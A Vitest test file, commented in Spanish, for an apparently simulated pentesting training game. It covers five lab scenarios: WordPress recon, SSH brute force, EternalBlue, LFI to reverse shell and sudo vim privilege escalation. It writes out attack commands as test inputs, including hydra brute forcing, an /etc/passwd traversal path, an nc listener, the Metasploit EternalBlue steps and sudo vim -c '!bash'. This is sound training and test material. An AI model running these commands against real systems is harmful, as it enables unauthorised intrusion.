// ── commands/__tests__/happyPath.test.ts ──────────────────────────
// Happy path tests for each lab scenario
// Simulates the complete user flow from start to finish
//
// Organización:
//  - HELPERS: utilidades reutilizables
//  - SCENARIO 01..05: tests unitarios por paso + golden path E2E real
//  - CROSS-SCENARIO: comandos básicos

import { describe, it, expect, beforeEach } from 'vitest';
import { executeCommand, resetMsfState } from '../index';
import type { Machine } from '../../types';

// ── Reset MSF state before each test ─────────────────────────────
beforeEach(() => {
  resetMsfState();
});

// ═══════════════════════════════════════════════════════════════════
// HELPERS
// ═══════════════════════════════════════════════════════════════════

/** Máquina atacante base (Kali Linux) */
const createAttacker = (): Machine => ({
  id: 'attacker-01',
  machine_info: {
    hostname: 'kali-attacker',
    ip: '192.168.1.10',
    mac: '08:00:27:AA:BB:CC',
    os: 'Kali Linux 2023.4',
    status: 'up',
    type: 'workstation',
  },
  discovery_level: 4,
  scan_results: { ports: [] },
  web_enumeration: { web_server: 'none', cms: 'none', directories: [] },
  learning_steps: [],
  files: [],
});

/** Ejecuta un comando con contexto estándar */
const exec = (
  line: string,
  machine: Machine,
  allMachines: Machine[],
  currentMissionId: number
) => executeCommand(line, machine, allMachines, currentMissionId, undefined, '/');

/**
 * Aplica discovery_level manualmente.
 * Solo para tests UNITARIOS por paso (aislamiento intencionado).
 * NO usar en golden paths — usar evolveState allí.
 */
const withLevel = (machine: Machine, level: number): Machine => ({
  ...machine,
  discovery_level: level,
});

/**
 * Simula lo que hace el store después de completar una misión:
 * actualiza discovery_level de la máquina basado en lo que devolvió el sistema.
 *
 * Replica exactamente completeMission() de scenarioStore.ts:
 *   machines.map(m => m.id === mission.targetMachineId
 *     ? { ...m, discovery_level: Math.max(m.discovery_level, step.discoveryLevel) }
 *     : m)
 *
 * Esto hace los golden paths data-driven: el estado evoluciona
 * según lo que el sistema realmente produjo, no por valores artificiales.
 */
const evolveState = (
  machines: Machine[],
  result: ReturnType<typeof exec>
): Machine[] => {
  if (!result.completedMissionId) return machines;

  return machines.map(machine => {
    const step = machine.learning_steps.find(s => s.id === result.completedMissionId);
    if (step?.discoveryLevel !== undefined) {
      return {
        ...machine,
        discovery_level: Math.max(machine.discovery_level, step.discoveryLevel),
      };
    }
    return machine;
  });
};

/**
 * Assertion helper: verifica que un comando exitoso no marcó isError.
 * CommandResponse.isError es `boolean | undefined`:
 *   - undefined → sin error (campo no seteado intencionalmente en éxito)
 *   - true      → error explícito
 * `.not.toBe(true)` maneja tanto undefined como false correctamente.
 */
const expectSuccess = (result: ReturnType<typeof exec>) => {
  expect(result.isError).not.toBe(true);
};

// ═══════════════════════════════════════════════════════════════════
// SCENARIO 01: WordPress Vulnerable Lab
// ═══════════════════════════════════════════════════════════════════
describe('Happy Path: Scenario 01 - WordPress Lab', () => {
  const attacker = createAttacker();
  const wpTarget: Machine = {
    id: 'lab-scenario-01-wp',
    machine_info: {
      hostname: 'vulnerable-wp-lab',
      ip: '192.168.1.11',
      mac: '08:00:27:A1:B2:C3',
      os: 'Ubuntu 20.04 LTS',
      status: 'up',
      type: 'server',
    },
    discovery_level: 0,
    scan_results: {
      ports: [
        { port: 22, protocol: 'tcp', state: 'open', service: 'ssh', version: 'OpenSSH 8.2p1 Ubuntu', credentials: { user: 'admin', pass: 'P@ssw0rd123!' } },
        { port: 80, protocol: 'tcp', state: 'open', service: 'http', version: 'Apache httpd 2.4.41' },
        { port: 3306, protocol: 'tcp', state: 'filtered', service: 'mysql', version: 'unknown' },
      ],
    },
    web_enumeration: {
      web_server: 'Apache/2.4.41',
      cms: 'WordPress 6.0',
      directories: [
        { path: '/', status: 200, description: 'Página principal' },
        { path: '/wp-admin', status: 200, description: 'Panel de administración' },
        { path: '/uploads', status: 200, description: 'Directorio de archivos subidos' },
        { path: '/backup', status: 403, description: 'Copia de seguridad (Acceso denegado)' },
      ],
    },
    learning_steps: [
      { id: 1, task: 'Reconocimiento de red', text: 'Descubrir hosts: arp-scan', targetMachineId: 'lab-scenario-01-wp', discoveryLevel: 1 },
      { id: 2, task: 'Escaneo de puertos', text: 'Escanear: nmap -sV', targetMachineId: 'lab-scenario-01-wp', discoveryLevel: 2 },
      { id: 3, task: 'Enumeración Web', text: 'Acceder al sitio web', targetMachineId: 'lab-scenario-01-wp', discoveryLevel: 2 },
      { id: 4, task: 'Descubrimiento de directorios', text: 'gobuster dir', targetMachineId: 'lab-scenario-01-wp', discoveryLevel: 3 },
      { id: 5, task: 'Compromiso del servidor', text: 'Buscar credenciales y acceder', targetMachineId: 'lab-scenario-01-wp', discoveryLevel: 4 },
    ],
    files: [
      { path: '/uploads/config.bak', content: 'DB_USER=admin\nDB_PASS=P@ssw0rd123!', type: 'text' },
    ],
  };

  // ── Tests unitarios por paso (usan withLevel intencionalmente) ──

  it('Paso 1: arp-scan descubre el host', () => {
    const result = exec('arp-scan 192.168.1.0/24', attacker, [attacker, wpTarget], 1);
    expectSuccess(result);
    expect(result.completedMissionId).toBe(1);
    // Validar IP descubierta en propiedades estructurales si están disponibles
    expect(result.output).toContain('192.168.1.11');
  });

  it('Paso 2: nmap escanea puertos (requiere reconocimiento previo)', () => {
    const target = withLevel(wpTarget, 1);
    const result = exec('nmap -sV 192.168.1.11', attacker, [attacker, target], 2);
    expectSuccess(result);
    expect(result.completedMissionId).toBe(2);
    // String crítico: verificar que se detectaron puertos específicos
    expect(result.output).toContain('22/tcp');
    expect(result.output).toContain('80/tcp');
  });

  it('Paso 4: gobuster enumera directorios (requiere escaneo previo)', () => {
    const target = withLevel(wpTarget, 2);
    const result = exec('gobuster dir -u http://192.168.1.11 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt', attacker, [attacker, target], 4);
    expectSuccess(result);
    expect(result.completedMissionId).toBe(4);
    // String crítico: verificar directorios WordPress descubiertos
    expect(result.output).toContain('/wp-admin');
    expect(result.output).toContain('/uploads');
  });

  // ── Validaciones de errores ───────────────────────────────────

  it('nmap sin reconocimiento previo debe fallar', () => {
    const result = exec('nmap -sV 192.168.1.11', attacker, [attacker, wpTarget], 2);
    expect(result.isError).toBe(true);
    expect(result.completedMissionId).toBeUndefined();
  });

  it('gobuster sin nmap previo debe fallar', () => {
    const target = withLevel(wpTarget, 1);
    const result = exec('gobuster dir -u http://192.168.1.11 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt', attacker, [attacker, target], 4);
    expect(result.isError).toBe(true);
    expect(result.completedMissionId).toBeUndefined();
  });

  // ── Golden path E2E (estado evoluciona desde resultados reales) ─

  it('Golden path: arp-scan → nmap → gobuster sin simular estado', () => {
    let machines: Machine[] = [attacker, wpTarget];

    // Paso 1: reconocimiento
    let result = exec('arp-scan 192.168.1.0/24', attacker, machines, 1);
    expect(result.completedMissionId).toBe(1);
    machines = evolveState(machines, result); // discovery_level 0→1

    // Paso 2: escaneo de puertos (solo posible porque evolveState actualizó el nivel)
    result = exec('nmap -sV 192.168.1.11', attacker, machines, 2);
    expect(result.completedMissionId).toBe(2);
    machines = evolveState(machines, result); // discovery_level 1→2

    // Paso 4: enumeración web (solo posible porque nivel fue a 2)
    result = exec('gobuster dir -u http://192.168.1.11 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt', attacker, machines, 4);
    expect(result.completedMissionId).toBe(4);
    expectSuccess(result);
  });
});

// ═══════════════════════════════════════════════════════════════════
// SCENARIO 02: SSH Brute Force Lab
// ═══════════════════════════════════════════════════════════════════
describe('Happy Path: Scenario 02 - SSH Brute Force', () => {
  const attacker = createAttacker();
  const sshTarget: Machine = {
    id: 'lab-scenario-02-ssh',
    machine_info: {
      hostname: 'ssh-target-lab',
      ip: '10.10.10.10',
      mac: '08:00:27:B2:C3:D4',
      os: 'Ubuntu 22.04 LTS',
      status: 'up',
      type: 'server',
    },
    discovery_level: 0,
    scan_results: {
      ports: [
        { port: 22, protocol: 'tcp', state: 'open', service: 'ssh', version: 'OpenSSH 8.9p1 Ubuntu', credentials: { user: 'root', pass: 'toor' } },
        { port: 8080, protocol: 'tcp', state: 'open', service: 'http-alt', version: 'nginx/1.18.0' },
      ],
    },
    web_enumeration: { web_server: 'nginx/1.18.0', cms: 'none', directories: [] },
    learning_steps: [
      { id: 1, task: 'Reconocimiento de red', text: 'arp-scan', targetMachineId: 'lab-scenario-02-ssh', discoveryLevel: 1 },
      { id: 2, task: 'Escaneo de puertos', text: 'nmap -sV', targetMachineId: 'lab-scenario-02-ssh', discoveryLevel: 2 },
      { id: 3, task: 'Fuerza bruta SSH', text: 'hydra', targetMachineId: 'lab-scenario-02-ssh', discoveryLevel: 3 },
      { id: 4, task: 'Acceso por SSH', text: 'ssh root@ip', targetMachineId: 'lab-scenario-02-ssh', discoveryLevel: 4 },
    ],
    files: [{ path: '/root/flag.txt', content: 'THM{SSH_BRUTE_FORCE_SUCCESS}', type: 'text' }],
  };

  // ── Tests unitarios por paso ──────────────────────────────────

  it('Paso 1: arp-scan descubre el host', () => {
    const result = exec('arp-scan 10.10.10.0/24', attacker, [attacker, sshTarget], 1);
    expectSuccess(result);
    expect(result.completedMissionId).toBe(1);
    expect(result.output).toContain('10.10.10.10');
  });

  it('Paso 2: nmap detecta puerto 22 SSH', () => {
    const target = withLevel(sshTarget, 1);
    const result = exec('nmap -sV 10.10.10.10', attacker, [attacker, target], 2);
    expectSuccess(result);
    expect(result.completedMissionId).toBe(2);
    expect(result.output).toContain('22/tcp');
  });

  it('Paso 3: hydra encuentra credenciales — valida propiedades, no strings', () => {
    const target = withLevel(sshTarget, 2);
    const result = exec('hydra -l root -P /usr/share/wordlists/rockyou.txt 10.10.10.10 ssh', attacker, [attacker, target], 3);
    expectSuccess(result);
    expect(result.foundCredentials).toBeDefined();
    expect(result.foundCredentials?.user).toBe('root');
    expect(result.foundCredentials?.pass).toBe('toor');
    expect(result.completedMissionId).toBe(3);
  });

  it('Paso 4: ssh conecta — valida cambio de máquina activa', () => {
    const target = withLevel(sshTarget, 3);
    const result = exec('ssh root@10.10.10.10 toor', attacker, [attacker, target], 4);
    expectSuccess(result);
    expect(result.newMachineId).toBe('lab-scenario-02-ssh');
    expect(result.completedMissionId).toBe(4);
  });

  // ── Validaciones de errores ───────────────────────────────────

  it('ssh sin hydra previo debe fallar', () => {
    const target = withLevel(sshTarget, 2);
    const result = exec('ssh root@10.10.10.10 toor', attacker, [attacker, target], 4);
    expect(result.isError).toBe(true);
    expect(result.completedMissionId).toBeUndefined();
    expect(result.newMachineId).toBeUndefined();
  });

  it('ssh con credenciales incorrectas debe fallar', () => {
    const target = withLevel(sshTarget, 3);
    const result = exec('ssh root@10.10.10.10 wrongpass', attacker, [attacker, target], 4);
    expect(result.isError).toBe(true);
    expect(result.newMachineId).toBeUndefined();
  });

  // ── Golden path E2E ──────────────────────────────────────────

  it('Golden path: arp-scan → nmap → hydra → ssh (estado evoluciona naturalmente)', () => {
    let machines: Machine[] = [attacker, sshTarget];

    // Paso 1
    let result = exec('arp-scan 10.10.10.0/24', attacker, machines, 1);
    expect(result.completedMissionId).toBe(1);
    machines = evolveState(machines, result);

    // Paso 2
    result = exec('nmap -sV 10.10.10.10', attacker, machines, 2);
    expect(result.completedMissionId).toBe(2);
    machines = evolveState(machines, result);

    // Paso 3: hydra — verifica credenciales encontradas
    result = exec('hydra -l root -P /usr/share/wordlists/rockyou.txt 10.10.10.10 ssh', attacker, machines, 3);
    expect(result.completedMissionId).toBe(3);
    expect(result.foundCredentials?.user).toBe('root');
    expect(result.foundCredentials?.pass).toBe('toor');
    machines = evolveState(machines, result);

    // Paso 4: ssh — verifica cambio de contexto de máquina
    result = exec('ssh root@10.10.10.10 toor', attacker, machines, 4);
    expect(result.completedMissionId).toBe(4);
    expect(result.newMachineId).toBe('lab-scenario-02-ssh');
  });
});

// ═══════════════════════════════════════════════════════════════════
// SCENARIO 03: EternalBlue - MS17-010
// ═══════════════════════════════════════════════════════════════════
describe('Happy Path: Scenario 03 - EternalBlue', () => {
  beforeEach(() => {
    resetMsfState();
  });

  const attacker = createAttacker();
  const win7Target: Machine = {
    id: 'win7-target',
    machine_info: {
      hostname: 'WIN7-TARGET',
      ip: '172.16.0.11',
      mac: '08:00:27:C4:D5:E6',
      os: 'Windows 7 Professional SP1 x64',
      status: 'up',
      type: 'workstation',
    },
    discovery_level: 0,
    scan_results: {
      ports: [
        { port: 135, protocol: 'tcp', state: 'open', service: 'msrpc', version: 'Microsoft Windows RPC' },
        { port: 139, protocol: 'tcp', state: 'open', service: 'netbios-ssn', version: 'Microsoft Windows netbios-ssn' },
        { port: 445, protocol: 'tcp', state: 'open', service: 'microsoft-ds', version: 'Windows 7 Professional 7601 Service Pack 1' },
        { port: 49152, protocol: 'tcp', state: 'open', service: 'msrpc', version: 'Microsoft Windows RPC' },
      ],
    },
    web_enumeration: { web_server: 'none', cms: 'none', directories: [] },
    learning_steps: [
      { id: 1, task: 'Reconocimiento de red', text: 'arp-scan', targetMachineId: 'win7-target', discoveryLevel: 1 },
      { id: 2, task: 'Escaneo de puertos', text: 'nmap -sV', targetMachineId: 'win7-target', discoveryLevel: 2 },
      { id: 3, task: 'Verificar vulnerabilidad', text: 'msfconsole auxiliary', targetMachineId: 'win7-target', discoveryLevel: 2 },
      { id: 4, task: 'Explotar EternalBlue', text: 'msfconsole exploit', targetMachineId: 'win7-target', discoveryLevel: 3 },
      { id: 5, task: 'Verificar acceso SYSTEM', text: 'getuid', targetMachineId: 'win7-target', discoveryLevel: 4 },
    ],
    files: [],
  };

  // ── Tests unitarios por paso ──────────────────────────────────

  it('Paso 1: arp-scan descubre Windows 7', () => {
    const result = exec('arp-scan 172.16.0.0/24', attacker, [attacker, win7Target], 1);
    expectSuccess(result);
    expect(result.completedMissionId).toBe(1);
    expect(result.output).toContain('172.16.0.11');
  });

  it('Paso 2: nmap detecta SMB en puerto 445', () => {
    const target = withLevel(win7Target, 1);
    const result = exec('nmap -sV 172.16.0.11', attacker, [attacker, target], 2);
    expectSuccess(result);
    expect(result.completedMissionId).toBe(2);
    expect(result.output).toContain('445/tcp');
  });

  // ── Golden path completo MSF (estado evoluciona naturalmente) ─
  // MSF es stateful y secuencial — el estado de sesión lo mantiene el módulo,
  // el discovery_level de la máquina evoluciona vía evolveState.

  it('Golden path: arp-scan → nmap → MSF auxiliary → exploit → getuid', () => {
    let machines: Machine[] = [attacker, win7Target];

    // Paso 1
    let result = exec('arp-scan 172.16.0.0/24', attacker, machines, 1);
    expect(result.completedMissionId).toBe(1);
    machines = evolveState(machines, result);

    // Paso 2
    result = exec('nmap -sV 172.16.0.11', attacker, machines, 2);
    expect(result.completedMissionId).toBe(2);
    machines = evolveState(machines, result);

    // Paso 3-5: MSF (flujo stateful — no hay discovery_level que evolucionar entre subpasos)
    exec('msfconsole', attacker, machines, 3);

    result = exec('search ms17', attacker, machines, 3);
    expect(result.output).toContain('smb_ms17_010');

    exec('use 0', attacker, machines, 3);
    exec('set RHOSTS 172.16.0.11', attacker, machines, 3);

    result = exec('run', attacker, machines, 3);
    expect(result.output).toContain('VULNERABLE');
    expect(result.completedMissionId).toBe(3);
    machines = evolveState(machines, result);

    exec('back', attacker, machines, 4);

    result = exec('search ms17', attacker, machines, 4);
    expect(result.output).toContain('eternalblue');

    exec('use 1', attacker, machines, 4);
    exec('set RHOSTS 172.16.0.11', attacker, machines, 4);
    exec('set LHOST 192.168.1.10', attacker, machines, 4);

    result = exec('exploit', attacker, machines, 4);
    expect(result.output).toContain('Meterpreter session');
    expect(result.completedMissionId).toBe(4);
    machines = evolveState(machines, result);

    // Paso 5: verificar SYSTEM — string crítico para el escenario
    result = exec('getuid', attacker, machines, 5);
    expect(result.output).toContain('NT AUTHORITY');
    expect(result.output).toContain('SYSTEM');
    expect(result.completedMissionId).toBe(5);
  });
});

// ═══════════════════════════════════════════════════════════════════
// SCENARIO 04: LFI to RCE
// ═══════════════════════════════════════════════════════════════════
describe('Happy Path: Scenario 04 - LFI to RCE', () => {
  const attacker = createAttacker();
  const lfiTarget: Machine = {
    id: 'lab-scenario-04-lfi',
    machine_info: {
      hostname: 'dev-portal-backup',
      ip: '192.168.20.11',
      mac: '08:00:27:D6:E7:F8',
      os: 'Debian 11 (Bullseye)',
      status: 'up',
      type: 'server',
    },
    discovery_level: 0,
    scan_results: {
      ports: [
        { port: 22, protocol: 'tcp', state: 'open', service: 'ssh', version: 'OpenSSH 8.4p1 Debian' },
        { port: 80, protocol: 'tcp', state: 'open', service: 'http', version: 'Apache/2.4.52 (Debian)' },
      ],
    },
    web_enumeration: {
      web_server: 'Apache/2.4.52',
      cms: 'Custom PHP Portal',
      directories: [
        { path: '/', status: 200, description: 'Página principal' },
        { path: '/upload.php', status: 200, description: 'Subida de archivos' },
      ],
    },
    learning_steps: [
      { id: 1, task: 'Reconocimiento', text: 'arp-scan', targetMachineId: 'lab-scenario-04-lfi', discoveryLevel: 1 },
      { id: 2, task: 'Escaneo', text: 'nmap -sV', targetMachineId: 'lab-scenario-04-lfi', discoveryLevel: 2 },
      { id: 3, task: 'LFI Discovery', text: 'Probar ?page=../../../../etc/passwd', targetMachineId: 'lab-scenario-04-lfi', discoveryLevel: 3 },
      { id: 4, task: 'Setup Listener', text: 'nc -nlvp 4444', targetMachineId: 'lab-scenario-04-lfi', discoveryLevel: 3 },
      { id: 5, task: 'Preparar Payload', text: 'Subir payload.php', targetMachineId: 'lab-scenario-04-lfi', discoveryLevel: 3 },
      { id: 6, task: 'Remote Code Execution', text: '?page=uploads/payload.php', targetMachineId: 'lab-scenario-04-lfi', discoveryLevel: 4 },
    ],
    files: [
      { path: '/var/www/html/flag.txt', content: 'THM{LFI_REVERSE_SHELL_PWNED}', type: 'text' },
    ],
  };

  const allMachines = [attacker, lfiTarget];

  // ── Tests unitarios por paso ──────────────────────────────────

  it('Paso 1: arp-scan descubre el host', () => {
    const result = exec('arp-scan 192.168.20.0/24', attacker, allMachines, 1);
    expectSuccess(result);
    expect(result.output).toContain('192.168.20.11');
    expect(result.completedMissionId).toBe(1);
  });

  it('Paso 2: nmap detecta HTTP en puerto 80', () => {
    const target = withLevel(lfiTarget, 1);
    const result = exec('nmap -sV 192.168.20.11', attacker, [attacker, target], 2);
    expectSuccess(result);
    expect(result.output).toContain('80/tcp');
    expect(result.completedMissionId).toBe(2);
  });

  it('Paso 4: nc -nlvp activa listener — valida propiedades de blockingCommand', () => {
    const result = exec('nc -nlvp 4444', attacker, allMachines, 4);
    expectSuccess(result);
    expect(result.completedMissionId).toBe(4);
    // Validar propiedades estructurales, no strings de output
    expect(result.blockingCommand).toBeDefined();
    expect(result.blockingCommand?.listeningPort).toBe(4444);
  });

  // ── Validaciones de errores ───────────────────────────────────

  it('nc fuera del contexto LFI no completa ninguna misión', () => {
    const result = exec('nc -nlvp 9999', attacker, [attacker], 1);
    expectSuccess(result);
    expect(result.completedMissionId).toBeUndefined();
  });

  it('nc sin puerto debe fallar', () => {
    const result = exec('nc -nlvp', attacker, allMachines, 4);
    expect(result.isError).toBe(true);
    expect(result.blockingCommand).toBeUndefined();
  });

  it('nmap sin reconocimiento previo debe fallar', () => {
    const result = exec('nmap -sV 192.168.20.11', attacker, allMachines, 2);
    expect(result.isError).toBe(true);
    expect(result.completedMissionId).toBeUndefined();
  });

  // ── Golden path E2E ──────────────────────────────────────────

  it('Golden path: arp-scan → nmap → nc listener (estado evoluciona naturalmente)', () => {
    let machines: Machine[] = [attacker, lfiTarget];

    // Paso 1
    let result = exec('arp-scan 192.168.20.0/24', attacker, machines, 1);
    expect(result.completedMissionId).toBe(1);
    machines = evolveState(machines, result);

    // Paso 2
    result = exec('nmap -sV 192.168.20.11', attacker, machines, 2);
    expect(result.completedMissionId).toBe(2);
    machines = evolveState(machines, result);

    // Paso 4: nc listener — validar propiedades del estado
    result = exec('nc -nlvp 4444', attacker, machines, 4);
    expect(result.completedMissionId).toBe(4);
    expect(result.blockingCommand?.listeningPort).toBe(4444);
  });
});

// ═══════════════════════════════════════════════════════════════════
// SCENARIO 05: Privilege Escalation via sudo vim
// ═══════════════════════════════════════════════════════════════════
describe('Happy Path: Scenario 05 - Privilege Escalation', () => {
  const attacker = createAttacker();
  const privescTarget: Machine = {
    id: 'lab-scenario-05-privesc',
    machine_info: {
      hostname: 'privesc-lab',
      ip: '192.168.30.11',
      mac: '08:00:27:E8:F9:A1',
      os: 'Ubuntu 20.04 LTS',
      status: 'up',
      type: 'server',
    },
    discovery_level: 0,
    scan_results: {
      ports: [
        { port: 22, protocol: 'tcp', state: 'open', service: 'ssh', version: 'OpenSSH 8.2p1 Ubuntu', credentials: { user: 'developer', pass: 'dev2024' } },
        { port: 80, protocol: 'tcp', state: 'open', service: 'http', version: 'Apache httpd 2.4.41' },
      ],
    },
    web_enumeration: { web_server: 'Apache/2.4.41', cms: 'none', directories: [] },
    learning_steps: [
      { id: 1, task: 'Reconocimiento de red', text: 'Descubrí el host activo: arp-scan <network/cidr>', targetMachineId: 'lab-scenario-05-privesc', discoveryLevel: 1 },
      { id: 2, task: 'Escaneo de puertos', text: 'Identificá servicios: nmap -sV <target-ip>', targetMachineId: 'lab-scenario-05-privesc', discoveryLevel: 2 },
      { id: 3, task: 'Fuerza bruta SSH', text: 'Obtené credenciales: hydra -l developer -P rockyou.txt <target-ip> ssh', targetMachineId: 'lab-scenario-05-privesc', discoveryLevel: 3 },
      { id: 4, task: 'Acceso SSH', text: 'Conectate: ssh developer@<target-ip> <password>', targetMachineId: 'lab-scenario-05-privesc', discoveryLevel: 3 },
      { id: 5, task: 'Enumeración de sudo', text: "Listá permisos: sudo -l", targetMachineId: 'lab-scenario-05-privesc', discoveryLevel: 3 },
      { id: 6, task: 'Escalada de privilegios', text: "Usá vim para escalar: sudo vim -c '!bash'", targetMachineId: 'lab-scenario-05-privesc', discoveryLevel: 4 },
      { id: 7, task: 'Capturar la flag de root', text: 'Leé la flag: cat /root/root.txt', targetMachineId: 'lab-scenario-05-privesc', discoveryLevel: 4 },
    ],
    files: [
      { path: '/etc/sudoers', content: 'developer ALL=(ALL) NOPASSWD: /usr/bin/vim', type: 'text' },
      { path: '/root/root.txt', content: 'ZIL{SUDO_VIM_PRIVESC_COMPLETE}', type: 'text' },
      { path: '/home/developer/user.txt', content: 'ZIL{SSH_ACCESS_DEVELOPER}', type: 'text' },
    ],
  };

  // ── Tests unitarios por paso ──────────────────────────────────

  it('Paso 1: arp-scan descubre el host', () => {
    const result = exec('arp-scan 192.168.30.0/24', attacker, [attacker, privescTarget], 1);
    expectSuccess(result);
    expect(result.completedMissionId).toBe(1);
    expect(result.output).toContain('192.168.30.11');
  });

  it('Paso 2: nmap detecta SSH en puerto 22', () => {
    const target = withLevel(privescTarget, 1);
    const result = exec('nmap -sV 192.168.30.11', attacker, [attacker, target], 2);
    expectSuccess(result);
    expect(result.completedMissionId).toBe(2);
    expect(result.output).toContain('22/tcp');
  });

  it('Paso 3: hydra — valida credenciales en propiedades, no en strings', () => {
    const target = withLevel(privescTarget, 2);
    const result = exec('hydra -l developer -P /usr/share/wordlists/rockyou.txt 192.168.30.11 ssh', attacker, [attacker, target], 3);
    expectSuccess(result);
    expect(result.foundCredentials).toBeDefined();
    expect(result.foundCredentials?.user).toBe('developer');
    expect(result.foundCredentials?.pass).toBe('dev2024');
    expect(result.completedMissionId).toBe(3);
  });

  it('Paso 4: ssh — valida cambio de máquina activa', () => {
    const target = withLevel(privescTarget, 3);
    const result = exec('ssh developer@192.168.30.11 dev2024', attacker, [attacker, target], 4);
    expectSuccess(result);
    expect(result.newMachineId).toBe('lab-scenario-05-privesc');
    expect(result.completedMissionId).toBe(4);
  });

  it('Paso 5: sudo -l, muestra permisos de vim (string crítico para el escenario)', () => {
    const target = withLevel(privescTarget, 3);
    const result = exec('sudo -l', target, [attacker, target], 5);
    expectSuccess(result);
    expect(result.completedMissionId).toBe(5);
    // String crítico: NOPASSWD es esencial para el escenario de privilege escalation
    expect(result.output).toContain('NOPASSWD');
    expect(result.output).toContain('vim');
  });

  it('Paso 6: sudo vim -c !bash escala a root (uid=0 es crítico)', () => {
    const target = withLevel(privescTarget, 3);
    const result = exec("sudo vim -c '!bash'", target, [attacker, target], 6);
    expectSuccess(result);
    expect(result.completedMissionId).toBe(6);
    // String crítico: uid=0 confirma escalada exitosa a root
    expect(result.output).toContain('uid=0');
  });

  it('Paso 7: cat /root/root.txt — flag es string crítico', () => {
    const target = withLevel(privescTarget, 4);
    const result = exec('cat /root/root.txt', target, [attacker, target], 7);
    expectSuccess(result);
    expect(result.completedMissionId).toBe(7);
    // String crítico del juego: flag exacta requerida
    expect(result.output).toBe('ZIL{SUDO_VIM_PRIVESC_COMPLETE}');
  });

  // ── Validaciones de errores ───────────────────────────────────

  it('ssh sin hydra previo debe fallar', () => {
    const target = withLevel(privescTarget, 2);
    const result = exec('ssh developer@192.168.30.11 dev2024', attacker, [attacker, target], 3);
    expect(result.isError).toBe(true);
    expect(result.completedMissionId).toBeUndefined();
    expect(result.newMachineId).toBeUndefined();
  });

  // ── Golden path E2E ──────────────────────────────────────────

  it('Golden path: arp-scan → nmap → hydra → ssh → sudo -l → privesc → flag (sin simular estado)', () => {
    let machines: Machine[] = [attacker, privescTarget];

    // Paso 1: reconocimiento
    let result = exec('arp-scan 192.168.30.0/24', attacker, machines, 1);
    expect(result.completedMissionId).toBe(1);
    machines = evolveState(machines, result);

    // Paso 2: escaneo
    result = exec('nmap -sV 192.168.30.11', attacker, machines, 2);
    expect(result.completedMissionId).toBe(2);
    machines = evolveState(machines, result);

    // Paso 3: brute force — verifica credenciales devueltas por el sistema
    result = exec('hydra -l developer -P /usr/share/wordlists/rockyou.txt 192.168.30.11 ssh', attacker, machines, 3);
    expect(result.completedMissionId).toBe(3);
    expect(result.foundCredentials?.user).toBe('developer');
    expect(result.foundCredentials?.pass).toBe('dev2024');
    machines = evolveState(machines, result);

    // Paso 4: acceso SSH — verifica cambio de contexto de máquina activa
    result = exec('ssh developer@192.168.30.11 dev2024', attacker, machines, 4);
    expect(result.completedMissionId).toBe(4);
    expect(result.newMachineId).toBe('lab-scenario-05-privesc');
    machines = evolveState(machines, result);

    // Los siguientes pasos se ejecutan como target (sesión SSH activa)
    const sessionTarget = machines.find(m => m.id === 'lab-scenario-05-privesc')!;

    // Paso 5: enumeración sudo
    result = exec('sudo -l', sessionTarget, machines, 5);
    expect(result.completedMissionId).toBe(5);
    expect(result.output).toContain('NOPASSWD');
    machines = evolveState(machines, result);

    // Paso 6: escalada de privilegios
    result = exec("sudo vim -c '!bash'", sessionTarget, machines, 6);
    expect(result.completedMissionId).toBe(6);
    expect(result.output).toContain('uid=0');
    machines = evolveState(machines, result);

    // Paso 7: flag de root — string crítico del juego, usar toBe exacto
    const rootTarget = machines.find(m => m.id === 'lab-scenario-05-privesc')!;
    result = exec('cat /root/root.txt', rootTarget, machines, 7);
    expect(result.completedMissionId).toBe(7);
    expect(result.output).toBe('ZIL{SUDO_VIM_PRIVESC_COMPLETE}');
  });
});

// ═══════════════════════════════════════════════════════════════════
// CROSS-SCENARIO: Comandos básicos
// ═══════════════════════════════════════════════════════════════════
describe('Comandos básicos funcionan en todos los contextos', () => {
  const attacker = createAttacker();

  it('help muestra comandos clave de pentesting', () => {
    const result = exec('help', attacker, [attacker], 1);
    // isError puede ser undefined (éxito) o false explícito
    expect(result.isError).not.toBe(true);
    // String crítico: verificar comandos esenciales disponibles
    expect(result.output).toContain('arp-scan');
    expect(result.output).toContain('nmap');
    expect(result.output).toContain('hydra');
    expect(result.output).toContain('ssh');
    expect(result.output).toContain('msfconsole');
  });

  it('whoami muestra root en atacante', () => {
    const result = exec('whoami', attacker, [attacker], 1);
    expect(result.isError).not.toBe(true);
    expect(result.output).toContain('root');
  });

  it('ifconfig muestra IP del atacante', () => {
    const result = exec('ifconfig', attacker, [attacker], 1);
    expect(result.isError).not.toBe(true);
    expect(result.output).toContain('192.168.1.10');
  });

  it('clear retorna CLEAR_TERMINAL', () => {
    const result = exec('clear', attacker, [attacker], 1);
    expect(result.output).toBe('CLEAR_TERMINAL');
  });

  it('comando desconocido retorna isError true', () => {
    const result = exec('fakecommand', attacker, [attacker], 1);
    expect(result.isError).toBe(true);
    expect(result.output).toContain('Command not found');
  });

  it('ls lista archivos del atacante', () => {
    const attackerWithFiles = {
      ...attacker,
      files: [
        { path: '/root/payload.php', content: '<?php echo "test"; ?>', type: 'text' as const },
        { path: '/root/notes.txt', content: 'My notes', type: 'text' as const },
      ],
    };
    const result = exec('ls /root', attackerWithFiles, [attackerWithFiles], 1);
    expect(result.isError).not.toBe(true);
    expect(result.output).toContain('payload.php');
    expect(result.output).toContain('notes.txt');
  });

  it('cat lee archivo existente — valida contenido exacto', () => {
    const attackerWithFiles = {
      ...attacker,
      files: [
        { path: '/root/flag.txt', content: 'THM{TEST_FLAG}', type: 'text' as const },
      ],
    };
    const result = exec('cat /root/flag.txt', attackerWithFiles, [attackerWithFiles], 1);
    expectSuccess(result);
    // Contenido exacto es crítico para flags
    expect(result.output).toBe('THM{TEST_FLAG}');
  });

  it('cat con archivo inexistente retorna isError true', () => {
    const result = exec('cat /root/nonexistent.txt', attacker, [attacker], 1);
    expect(result.isError).toBe(true);
    expect(result.completedMissionId).toBeUndefined();
  });
});